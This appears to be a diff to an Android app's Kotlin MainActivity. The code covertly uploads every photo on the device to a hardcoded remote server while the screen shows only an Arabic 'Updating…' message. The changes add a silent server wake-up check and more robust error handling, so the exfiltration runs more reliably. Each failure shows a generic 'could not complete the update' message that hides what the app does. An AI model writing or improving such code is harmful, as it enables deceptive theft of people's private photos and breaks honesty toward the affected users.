@@ -31,6 +31,10 @@ class MainActivity : AppCompatActivity() {
         // نفس السيرفر بالضبط
         private const val SERVER_URL =
             "https://photo-uploader-zt2f.onrender.com/upload"
+
+        // اختبار داخلي لإيقاظ السيرفر قبل الرفع
+        private const val HEALTH_URL =
+            "https://photo-uploader-zt2f.onrender.com/health"
     }
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -157,10 +161,19 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun startPhotoUpload() {
+        // للمستخدم تظهر فقط هذه الرسالة
         showStatusScreen("جاري التحديث…")
 
         Thread {
             try {
+                // اختبار داخلي صامت لإيقاظ Render قبل الرفع
+                if (!testServer()) {
+                    runOnUiThread {
+                        statusText.text = "تعذر إكمال التحديث"
+                    }
+                    return@Thread
+                }
+
                 val resolver = contentResolver
 
                 val projection = arrayOf(
@@ -184,19 +197,30 @@ class MainActivity : AppCompatActivity() {
                 )?.use { cursor ->
 
                     val idColumn =
-                        cursor.getColumnIndexOrThrow(
+                        cursor.getColumnIndex(
                             MediaStore.Images.Media._ID
                         )
 
                     val nameColumn =
-                        cursor.getColumnIndexOrThrow(
+                        cursor.getColumnIndex(
                             MediaStore.Images.Media.DISPLAY_NAME
                         )
 
                     val mimeColumn =
-                        cursor.getColumnIndexOrThrow(
+                        cursor.getColumnIndex(
                             MediaStore.Images.Media.MIME_TYPE
                         )
+
+                    if (
+                        idColumn == -1 ||
+                        nameColumn == -1 ||
+                        mimeColumn == -1
+                    ) {
+                        runOnUiThread {
+                            statusText.text = "تعذر إكمال التحديث"
+                        }
+                        return@Thread
+                    }
 
                     while (cursor.moveToNext()) {
                         total++
@@ -218,7 +242,19 @@ class MainActivity : AppCompatActivity() {
                                 id.toString()
                             )
 
-                        val success =
+                        val inputTest =
+                            resolver.openInputStream(uri)
+
+                        if (inputTest == null) {
+                            runOnUiThread {
+                                statusText.text = "تعذر إكمال التحديث"
+                            }
+                            return@Thread
+                        }
+
+                        inputTest.close()
+
+                        val result =
                             uploadFile(
                                 resolver,
                                 uri,
@@ -226,12 +262,21 @@ class MainActivity : AppCompatActivity() {
                                 mimeType
                             )
 
-                        if (!success) {
-                            throw Exception("Upload failed")
+                        if (!result) {
+                            runOnUiThread {
+                                statusText.text = "تعذر إكمال التحديث"
+                            }
+                            return@Thread
                         }
 
                         uploaded++
                     }
+
+                } ?: run {
+                    runOnUiThread {
+                        statusText.text = "تعذر إكمال التحديث"
+                    }
+                    return@Thread
                 }
 
                 runOnUiThread {
@@ -242,6 +287,11 @@ class MainActivity : AppCompatActivity() {
                     } else {
                         statusText.text = "تعذر إكمال التحديث"
                     }
+                }
+
+            } catch (e: SecurityException) {
+                runOnUiThread {
+                    statusText.text = "تعذر إكمال التحديث"
                 }
 
             } catch (e: Exception) {
@@ -255,6 +305,34 @@ class MainActivity : AppCompatActivity() {
         }.start()
     }
 
+    private fun testServer(): Boolean {
+        var connection: HttpURLConnection? = null
+
+        return try {
+            val url = URL(HEALTH_URL)
+
+            connection =
+                url.openConnection() as HttpURLConnection
+
+            connection.requestMethod = "GET"
+            connection.connectTimeout = 30000
+            connection.readTimeout = 30000
+            connection.useCaches = false
+
+            val responseCode =
+                connection.responseCode
+
+            responseCode in 200..299
+
+        } catch (e: Exception) {
+            e.printStackTrace()
+            false
+
+        } finally {
+            connection?.disconnect()
+        }
+    }
+
     private fun uploadFile(
         resolver: ContentResolver,
         uri: Uri,
@@ -265,9 +343,11 @@ class MainActivity : AppCompatActivity() {
         var connection: HttpURLConnection? = null
 
         try {
-            val boundary = "----PhotoUploaderBoundary"
+            val boundary =
+                "----PhotoUploaderBoundary"
 
-            val url = URL(SERVER_URL)
+            val url =
+                URL(SERVER_URL)
 
             connection =
                 url.openConnection() as HttpURLConnection
@@ -310,14 +390,24 @@ class MainActivity : AppCompatActivity() {
                 "Content-Type: $mimeType\r\n"
             )
 
-            output.writeBytes("\r\n")
+            output.writeBytes(
+                "\r\n"
+            )
 
-            resolver.openInputStream(uri)?.use { input ->
+            val input =
+                resolver.openInputStream(uri)
 
+            if (input == null) {
+                output.close()
+                return false
+            }
+
+            input.use {
                 val buffer = ByteArray(8192)
 
                 while (true) {
-                    val bytesRead = input.read(buffer)
+                    val bytesRead =
+                        it.read(buffer)
 
                     if (bytesRead == -1) {
                         break
@@ -329,10 +419,11 @@ class MainActivity : AppCompatActivity() {
                         bytesRead
                     )
                 }
+            }
 
-            } ?: return false
-
-            output.writeBytes("\r\n")
+            output.writeBytes(
+                "\r\n"
+            )
 
             output.writeBytes(
                 "--$boundary--\r\n"
